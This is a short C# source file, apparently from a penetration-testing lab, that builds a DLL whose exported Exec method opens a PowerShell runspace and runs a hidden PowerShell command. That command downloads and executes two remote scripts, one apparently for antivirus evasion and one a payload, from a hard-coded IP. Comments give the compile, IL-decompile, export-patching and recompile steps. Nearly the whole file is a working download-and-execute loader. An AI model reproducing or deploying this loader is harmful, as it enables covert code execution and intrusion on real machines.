using System;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Management.Automation.Runspaces;

public class Program
{
public static void Main()
{
}
public class Code
{
public static void Exec()
//Compile
  //C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /platform:anycpu /reference:System.Management.Automation.dll /target:library /unsafe C:\rastalabs\ws05\SI0toSI1\linkedin.cs
//Decompile to IL
  //"C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\x64\ildasm.exe" /out:C:\rastalabs\ws05\SI0toSI1\linkedin.il C:\rastalabs\ws05\SI0toSI1\linkedin.dll
//Edit
  //.export [1]
//Recompile
  //C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe C:\rastalabs\ws05\SI0toSI1\linkedin.il /DLL /output=C:\rastalabs\ws05\SI0toSI1\linkedin-patched.dll

{
string command = "cmd /c start %windir%\\sysnative\\WindowsPowerShell\\v1.0\\powershell -Sta -Nop -Wind Hid -c iex(new-object net.webclient).downloadstring('http://10.10.16.34/avee.ps1');iex(new-object net.webclient).downloadstring('http://10.10.16.34/payload.ps1')";
RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
rspace.Open();
Pipeline pipeline = rspace.CreatePipeline();
pipeline.Commands.AddScript(command);
pipeline.Invoke();
}
}
}
